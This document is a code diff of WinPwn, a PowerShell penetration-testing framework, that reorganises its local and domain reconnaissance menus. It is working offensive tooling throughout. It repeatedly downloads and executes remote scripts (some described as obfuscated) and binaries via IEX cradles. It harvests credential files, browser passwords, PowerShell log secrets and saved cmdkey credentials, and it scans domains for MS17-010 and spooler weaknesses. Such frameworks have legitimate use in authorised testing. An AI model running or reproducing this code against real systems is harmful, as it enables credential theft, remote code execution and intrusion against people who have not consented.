@@ -121,16 +121,13 @@ function sharpcradle{
     if ($allthosedotnet)
     {
         @'
-
              
 __        ___       ____                 
 \ \      / (_)_ __ |  _ \__      ___ __  
  \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
   \ V  V / | | | | |  __/ \ V  V /| | | |
    \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
-
    --> Automate some internal Penetrationtest processes
-
 '@
         
         do
@@ -477,21 +474,24 @@ function localreconmodules
         License: BSD 3-Clause
     #>
     #Local Reconning
-            pathcheck
-            $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-ComputerDetails.ps1')
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
 
-            Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
-            
+
+           
+            function powershellsensitive
+            {
             Write-Host -ForegroundColor Yellow 'Parsing Event logs for sensitive Information:'
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
             Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/EventLogParser.exe' -Outfile "$currentPath\EventLogParser.exe"
             .\EventLogParser.exe eventid=4103 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
             .\EventLogParser.exe eventid=4104 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
-            if (isadmin){.\EventLogParser.exe eventid=4688 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"}
+            Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString' >> "$currentPath\LocalRecon\Powershell_Logs.txt" 
+	        if (isadmin){.\EventLogParser.exe eventid=4688 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"}
+            }
+            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-ComputerDetails.ps1')
+            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
 
-
+            function generalrecon{
+            Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
             #Check for WSUS Updates over HTTP
 	        Write-Host -ForegroundColor Yellow 'Checking for WSUS over http'
             $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
@@ -507,10 +507,6 @@ function localreconmodules
             Write-Host -ForegroundColor Yellow 'Check SMB-Signing for the local system'
             iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-SMBNegotiate.ps1')
             Invoke-SMBNegotiate -ComputerName localhost >> "$currentPath\Vulnerabilities\SMBSigningState.txt"
-
-            #Seatbelt
-            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-            Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to .\LocalRecon\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Seatbelt.exe -argument1 all >> $currentPath\LocalRecon\SeatBeltOutput.txt
 
             #Collecting Informations
             Write-Host -ForegroundColor Yellow 'Collecting local system Informations for later lookup, saving them to .\LocalRecon\'
@@ -646,12 +642,7 @@ function localreconmodules
 	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-Vulmap.ps1')
 	    Write-Host -ForegroundColor Yellow 'Checking if Software is outdated and therefore vulnerable / exploitable'
 	    Invoke-Vulmap | out-string -Width 4096 >> "$currentPath\Vulnerabilities\VulnerableSoftware.txt"
-            
-            $passhunt = Read-Host -Prompt 'Do you want to search for Passwords on this system using passhunt.exe? (Its worth it) (yes/no)'
-            if ($passhunt -eq "yes" -or $passhunt -eq "y" -or $passhunt -eq "Yes" -or $passhunt -eq "Y")
-            {
-                passhunt -local $true
-            }
+        
             
             # Collecting more information
             Write-Host -ForegroundColor Yellow 'Checking for accesible SAM/SYS Files'
@@ -692,20 +683,18 @@ function localreconmodules
             Write-Host -ForegroundColor Yellow 'Checking for usable credentials (cmdkey /list)'
             cmdkey /list >> "$currentPath\Vulnerabilities\SavedCredentials.txt" # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 
+            }
 
-
-            $dotnet = Read-Host -Prompt 'Do you want to search for .NET Binaries on this system? (theese can be easily reverse engineered for vulnerability analysis) (yes/no)'
-            if ($dotnet -eq "yes" -or $dotnet -eq "y" -or $dotnet -eq "Yes" -or $dotnet -eq "Y")
-            {
+           function dotnet{
                 Write-Host -ForegroundColor Yellow 'Searching for Files - Output is saved to the localrecon folder:'
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-DotNetServices.ps1')
                 Get-DotNetServices  >> "$currentPath\LocalRecon\DotNetBinaries.txt"
             }
 
+            function morerecon{
             if (isadmin)
             {
-                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/threatexpress/red-team-scripts/master/HostEnum.ps1'');Invoke-HostEnum >> .\LocalRecon\HostEnum.txt}'
-                 $PSrecon = Read-Host -Prompt 'Do you want to gather local computer Informations with PSRecon? (yes/no)'
+                $PSrecon = Read-Host -Prompt 'Do you want to gather local computer Informations with PSRecon? (yes/no)'
                 if ($PSrecon -eq "yes" -or $PSrecon -eq "y" -or $PSrecon -eq "Yes" -or $PSrecon -eq "Y")
                 {
                     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/gfoss/PSRecon/master/psrecon.ps1'' -Outfile .\LocalRecon\Psrecon.ps1;Write-Host -ForegroundColor Yellow ''Starting PsRecon:'';.\LocalRecon\Psrecon.ps1;pause}'
@@ -716,23 +705,49 @@ function localreconmodules
                 Write-Host -ForegroundColor Yellow 'Starting WINSpect:'
             invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/A-mIn3/WINspect/master/WINspect.ps1'');}'
             }
-
-         
-            $session = Read-Host -Prompt 'Do you want to start SessionGopher module? (yes/no)'
-            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
-            {
-                sessionGopher
             }
 
-            $search = Read-Host -Prompt 'Do you want to search for sensitive files on this local system? (config files, rdp files, password files and more) (yes/no) - takes a lot of time'
-            if ($search -eq "yes" -or $search -eq "y" -or $search -eq "Yes" -or $search -eq "Y")
-            {
+         
+            function sensitivefiles{
+            
                 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/find-interesting.ps1')
                 Write-Host -ForegroundColor Yellow 'Looking for interesting files:'
-                Find-InterestingFile -Path 'C:\' -Outfile "$currentPath\LocalRecon\InterestingFiles.txt"
-                Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup -Outfile "$currentPath\LocalRecon\MoreFiles.txt"
+                try{Find-InterestingFile -Path 'C:\' -Outfile "$currentPath\LocalRecon\InterestingFiles.txt"}catch{Write-Host ":-("}
+                try{Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup -Outfile "$currentPath\LocalRecon\MoreFiles.txt"}catch{Write-Host ":-("}
+                Write-Verbose "Enumerating more interesting files..."
+    
+                $SearchStrings = "*secret*","*net use*","*.kdb*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora","ntds.dit","*.dll.config","*.exe.config"
+                $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}
+      
+                $IndexedFiles |Format-List |Out-String -width 500 >> "$currentPath\LocalRecon\Sensitivelocalfiles.txt"
+                GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.kdb,*.rdp,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 500 >> "$currentPath\LocalRecon\MoreSensitivelocalfiles.txt"
+                function Get-IndexedFiles {
+                param (
+                [Parameter(Mandatory=$true)][string]$Pattern)  
+    
+                if($Path -eq ""){$Path = $PWD;} 
+        
+                $pattern = $pattern -replace "\*", "%"  
+                $path = $path + "\%"
+    
+                 $con = New-Object -ComObject ADODB.Connection
+                $rs = New-Object -ComObject ADODB.Recordset
+    
+                Try {
+                    $con.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")}
+                Catch {
+                    "[-] Indexed file search provider not available";Break
+                }
+                $rs.Open("SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE '" + $pattern + "' " , $con)
+    
+                While(-Not $rs.EOF){
+                $rs.Fields.Item("System.ItemPathDisplay").Value
+                 $rs.MoveNext()
+                }
             }
-         
+            }
+            
+            function browserpwn{
             $chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'
             if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
             {
@@ -754,8 +769,52 @@ function localreconmodules
             if ($browserinfos -eq "yes" -or $browserinfos -eq "y" -or $browserinfos -eq "Yes" -or $browserinfos -eq "Y")
             {
                 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-BrowserInformation.ps1')
-                Get-BrowserInformation >> "$currentPath\LocalRecon\AllBrowserHistory.txt"
+                Get-BrowserInformation | out-string -Width 4096 >> "$currentPath\LocalRecon\AllBrowserHistory.txt"
             }
+            }
+                pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    @'
+
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+
+   --> Localreconmodules
+
+'@
+    
+    do
+    {
+        Write-Host "================ WinPwn ================"
+        Write-Host -ForegroundColor Green '1. Collect general computer informations, this will take some time!'
+        Write-Host -ForegroundColor Green '2. Check Powershell event logs for credentials or other sensitive information! '
+        Write-Host -ForegroundColor Green '3. Collect Browser credentials as well as the history! '
+        Write-Host -ForegroundColor Green '4. Search for .NET Binaries on this system! '
+        Write-Host -ForegroundColor Green '5. Search for Passwords on this system using passhunt.exe!'
+        Write-Host -ForegroundColor Green '6. Start SessionGopher! '
+        Write-Host -ForegroundColor Green '7. Search for sensitive files on this local system (config files, rdp files, password files and more)! '
+        Write-Host -ForegroundColor Green '8. Execute PSRecon or Get-ComputerDetails (powersploit)! '
+        Write-Host -ForegroundColor Green '9. Exit. '
+        Write-Host "================ WinPwn ================"
+        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+
+        Switch ($masterquestion) 
+        {
+             1{generalrecon}
+             2{powershellsensitive}
+             3{browserpwn}
+             4{dotnet}
+             5{passhunt -local $true}
+             6{sessiongopher}
+             7{sensitivefiles}
+             8{morerecon}
+       }
+    }
+ While ($masterquestion -ne 9)
 }
 
 function passhunt
@@ -848,8 +907,9 @@ function domainreconmodules
         License: BSD 3-Clause
     #>
             #Domain / Network Reconing
-            $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-            pathcheck
+
+
+ function generaldomaininfo{
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
             $domain_Name = skulked
@@ -920,31 +980,10 @@ function domainreconmodules
 	        
             Write-Host -ForegroundColor Yellow 'Searching for Systems we have RDP access to..'
 	        rewires -LocalGroup RDP -Identity   >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
-	        
-	        $session = Read-Host -Prompt 'Do you want to search for potential sensitive domain share files - can take a while? (yes/no)'
-            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
-            {
-	        	mangers >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
 	        }
             
-            $aclight = Read-Host -Prompt 'Starting ACLAnalysis for Shadow Admin detection? (yes/no)'
-            if ($aclight -eq "yes" -or $aclight -eq "y" -or $aclight -eq "Yes" -or $aclight -eq "Y")
-            {
-	    	    Write-Host -ForegroundColor Yellow 'Starting ACLAnalysis for Shadow Admin detection:'
-                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'
-
-	        }
+            function spoolvulnscan{
             
-	    
-            $powersql = Read-Host -Prompt 'Start PowerUpSQL Checks? (yes/no)'
-            if ($powersql -eq "yes" -or $powersql -eq "y" -or $powersql -eq "Yes" -or $powersql -eq "Y")
-            {
-	    	    powerSQL    
-	        }
-
-            $spoolscan = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan? (yes/no)'
-            if ($spoolscan -eq "yes" -or $spoolscan -eq "y" -or $spoolscan -eq "Yes" -or $spoolscan -eq "Y")
-            {
 	    	        Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
                     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/SpoolerScanner/master/SpoolerScan.ps1')
                     $domcontrols = terracing
@@ -973,27 +1012,54 @@ function domainreconmodules
                         	}
 				}catch{Write-Host "Got an error"}
                     	}
-		    }
+            }
                     
 	        }
-	    $ms1710 = Read-Host -Prompt 'Search for MS17-10 vulnerable Windows Servers in the domain? (yes/no)'
-            if ($ms1710 -eq "yes" -or $ms1710 -eq "y" -or $ms1710 -eq "Yes" -or $ms1710 -eq "Y")
-            {
-	    	MS17-10	    	
-	    }
-	    
-	    $domainsharepass = Read-Host -Prompt 'Check Domain Network-Shares for cleartext passwords using passhunt.exe? (yes/no)'
-            if ($domainsharepass -eq "yes" -or $domainsharepass -eq "y" -or $domainsharepass -eq "Yes" -or $domainsharepass -eq "Y")
-            {
-                passhunt -domain $true
-            }
+	                    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
+    @'
 
-            $gpos = Read-Host -Prompt 'Check domain Group policies for common misconfigurations using Grouper2? (yes/no)'
-            if ($gpos -eq "yes" -or $gpos -eq "y" -or $gpos -eq "Yes" -or $gpos -eq "Y")
-            {
-                GPOAudit
-            }
-	    
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+
+   --> Localreconmodules
+
+'@
+    
+    do
+    {
+        Write-Host "================ WinPwn ================"
+        Write-Host -ForegroundColor Green '1. Collect general domain information!'
+        Write-Host -ForegroundColor Green '2. Search for potential sensitive domain share files! '
+        Write-Host -ForegroundColor Green '3. Starting ACLAnalysis for Shadow Admin detection! '
+        Write-Host -ForegroundColor Green '4. Start MS-RPRN RPC Service Scan! '
+        Write-Host -ForegroundColor Green '5. Start PowerUpSQL Checks!'
+        Write-Host -ForegroundColor Green '6. Search for MS17-10 vulnerable Windows Servers in the domain! '
+        Write-Host -ForegroundColor Green '7. Check Domain Network-Shares for cleartext passwords using passhunt.exe! '
+        Write-Host -ForegroundColor Green '8. Check domain Group policies for common misconfigurations using Grouper2! '
+        Write-Host -ForegroundColor Green '9. Exit. '
+        Write-Host "================ WinPwn ================"
+        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+
+        Switch ($masterquestion) 
+        {
+             1{generaldomaininfo}
+             2{mangers >> "$currentPath\DomainRecon\InterestingDomainshares.txt"}
+             3{invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'}
+             4{spoolvulnscan}
+             5{powerSQL}
+             6{MS17-10}
+             7{passhunt -domain $true}
+             8{GPOAudit}
+       }
+    }
+ While ($masterquestion -ne 9)
 }
 
 function GPOAudit
@@ -1186,11 +1252,7 @@ function privescmodules
     
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/IkeextCheck.ps1')
     Invoke-IkeextCheck >> "$currentPath\Vulnerabilities\IkeExtVulnerable.txt"
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-    Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
-    Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'; if (isadmin){Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe -argument1 audit >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt
-    Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe -argument1 all >> $currentPath\Exploitation\Browsercredentials.txt
-
+    
 }
 
 function lazagnemodule
@@ -1627,10 +1689,10 @@ __        ___       ____
         Write-Host -ForegroundColor Green '16. Just one ADRecon Report for me! '
         Write-Host -ForegroundColor Green '17. Search for potential vulnerable web apps (low hanging fruits)! '
         Write-Host -ForegroundColor Green '18. Find some network shares! '
-	    Write-Host -ForegroundColor Green '19. Execute some C# Magic for Creds, Recon and Privesc!'
-	    Write-Host -ForegroundColor Green '20. Load custom C# Binaries from a webserver to Memory and execute them!'
-	    Write-Host -ForegroundColor Green '21. Show some polar bears in action!'
-        Write-Host -ForegroundColor Green '22. Do an Group Policy Audit using Grouper2!'
+	Write-Host -ForegroundColor Green '19. Execute some C# Magic for Creds, Recon and Privesc!'
+	Write-Host -ForegroundColor Green '20. Load custom C# Binaries from a webserver to Memory and execute them!'
+	Write-Host -ForegroundColor Green '21. Show some polar bears in action!'
+    Write-Host -ForegroundColor Green '22. Do an Group Policy Audit using Grouper2!'
         Write-Host -ForegroundColor Green '23. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
@@ -1655,10 +1717,10 @@ __        ___       ____
             16{reconAD}
             17{fruit}
             18{sharenumeration}
-	        19{sharpcradle -allthosedotnet $true}
-	        20{sharpcradle}
-	        21{sharpcradle -polar $true}
-            22{GPOAudit}
+	    19{sharpcradle -allthosedotnet $true}
+	    20{sharpcradle}
+	    21{sharpcradle -polar $true}
+        22{GPOAudit}
        }
     }
  While ($masterquestion -ne 23)
